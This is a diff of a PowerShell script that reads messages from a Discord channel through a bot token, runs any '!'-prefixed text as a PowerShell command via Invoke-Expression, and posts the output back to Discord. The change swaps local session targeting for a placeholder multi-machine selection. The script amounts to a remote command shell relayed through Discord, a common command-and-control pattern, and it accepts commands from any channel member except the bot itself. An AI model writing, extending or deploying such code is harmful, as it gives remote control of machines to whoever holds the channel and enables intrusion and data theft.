@@ -11,8 +11,8 @@ $client = New-Object System.Net.Http.HttpClient
 $client.DefaultRequestHeaders.Authorization = "Bot $token"
 $client.DefaultRequestHeaders.Accept.Add("application/json")
 
-# Variable to store the selected session ID and user context
-$global:selectedSessionId = $null
+# Variable to store the selected machine
+$global:selectedMachine = $null
 $global:sessionLocked = $false
 
 # Function to send a message to Discord
@@ -44,46 +44,37 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to list running PowerShell sessions
-function List-Sessions {
+# Function to list available machines using `whoami`
+function List-Machines {
     if ($global:sessionLocked) {
-        Send-DiscordMessage -Message "A session is currently active. Use !exit_session to end it before listing other sessions."
+        Send-DiscordMessage -Message "A machine is currently selected. Use !exit_machine to deselect it before listing other machines."
         return
     }
 
-    # Identify the current user
-    $currentUser = whoami
-    Send-DiscordMessage -Message "Listing sessions for user: $currentUser"
-
-    # Get running PowerShell processes
-    $processes = Get-Process -Name "powershell"
-
-    if ($processes.Count -eq 0) {
-        return "No running PowerShell sessions found."
+    # Example of multiple connected machines with their whoami information
+    $machines = @("machine1\user", "machine2\user", "machine3\user")
+    
+    # Send the list to Discord
+    $machineList = "Available machines:`n"
+    $machines | ForEach-Object {
+        $machineList += "$_`n"
     }
-
-    # Prepare session list with user details
-    $sessionList = "User: $currentUser`n"
-    $processes | ForEach-Object {
-        $sessionList += "Session ID: $($_.Id) - Start Time: $($_.StartTime)`n"
-    }
-
-    return $sessionList
+    
+    Send-DiscordMessage -Message $machineList
 }
 
-# Function to execute a command in the selected session
-function Execute-InSession {
+# Function to execute a command on the selected machine
+function Execute-OnMachine {
     param (
-        [string]$sessionId,
+        [string]$machineName,
         [string]$command
     )
 
-    # Check if the session is still running
-    $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
-    if ($process) {
+    # Check if the machine is still selected
+    if ($global:selectedMachine -eq $machineName) {
         try {
-            # Inject the command into the selected session (simulating interaction)
-            $output = Invoke-Command -ScriptBlock {Invoke-Expression $command} -ErrorAction Stop
+            # Run the command (this is a simulation - adjust as needed to actually run commands on a remote machine)
+            $output = Invoke-Expression $command  # For now, it runs locally; adjust for remote execution
 
             if ($output) {
                 $result = $output -join "`n"  # Join multiline output for Discord message
@@ -94,68 +85,44 @@ function Execute-InSession {
             $result = "Error executing command: $_"
         }
 
-        # Limit output to a reasonable size for Discord
-        if ($result.Length -gt 2000) {
-            $result = $result.Substring(0, 1997) + "..."
-        }
-
+        # Send the output to Discord
         Send-DiscordMessage -Message $result
     } else {
-        $global:selectedSessionId = $null
+        Send-DiscordMessage -Message "Invalid machine selection or no machine selected."
+    }
+}
+
+# Function to execute bot commands
+function Execute-BotCommand {
+    param (
+        [string]$command
+    )
+
+    if ($command -eq "exit_machine") {
+        # Exit the current machine selection
+        $global:selectedMachine = $null
         $global:sessionLocked = $false
-        Send-DiscordMessage -Message "Session $sessionId is no longer running."
-    }
-}
-
-# Function to execute a PowerShell command
-function Execute-PowerShellCommand {
-    param (
-        [string]$command
-    )
-
-    # If a session is active, only the selected session can run commands
-    if ($global:selectedSessionId) {
-        if ($command -eq "exit_session") {
-            # Exit the current session
-            $global:selectedSessionId = $null
-            $global:sessionLocked = $false
-            Send-DiscordMessage -Message "Exited the session. You can now select a new session."
-        } else {
-            Execute-InSession -sessionId $global:selectedSessionId -command $command
-        }
-    } elseif ($command -eq "list_sessions") {
-        $result = List-Sessions
-        Send-DiscordMessage -Message $result
-    } elseif ($command.StartsWith("select_session")) {
-        $sessionId = $command.Replace("select_session ", "")
-        $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
-        if ($process) {
-            $global:selectedSessionId = $sessionId
+        Send-DiscordMessage -Message "Exited the machine. You can now select a new machine."
+    } elseif ($command -eq "list_machines") {
+        List-Machines
+    } elseif ($command.StartsWith("select:")) {
+        $machineName = $command.Replace("select:", "").Trim()
+        
+        # Simulate machine selection (adjust logic for actual machine availability)
+        if ($machineName -in @("machine1\user", "machine2\user", "machine3\user")) {
+            $global:selectedMachine = $machineName
             $global:sessionLocked = $true
-            Send-DiscordMessage -Message "Selected session $sessionId. Future commands will be sent to this session."
+            Send-DiscordMessage -Message "Selected machine: $machineName. Future commands will be sent to this machine."
         } else {
-            Send-DiscordMessage -Message "Invalid session ID: $sessionId"
+            Send-DiscordMessage -Message "Invalid machine name: $machineName"
         }
     } else {
-        # Execute the command in the current shell context if no session is selected
-        try {
-            # Run the PowerShell command and capture the output
-            $output = Invoke-Expression $command  # Runs the PowerShell command
-            if ($output) {
-                $result = $output -join "`n"  # Join multiline output for Discord message
-            } else {
-                $result = "Command executed successfully with no output."
-            }
-        } catch {
-            $result = "Error executing command: $_"
+        # Send the command to the selected machine
+        if ($global:selectedMachine) {
+            Execute-OnMachine -machineName $global:selectedMachine -command $command
+        } else {
+            Send-DiscordMessage -Message "No machine selected. Use !list_machines to see available machines."
         }
-
-        # Limit output to a reasonable size for Discord
-        if ($result.Length -gt 2000) {
-            $result = $result.Substring(0, 1997) + "..."
-        }
-
-        Send-DiscordMessage -Message $result
     }
 }
 
@@ -202,7 +169,7 @@ while ($true) {
             if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
                 if ($message.content.StartsWith("!")) {
                     $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
-                    Execute-PowerShellCommand -command $command
+                    Execute-BotCommand -command $command
                 }
                 $lastMessageId = $message.id  # Update the last processed message ID
             }
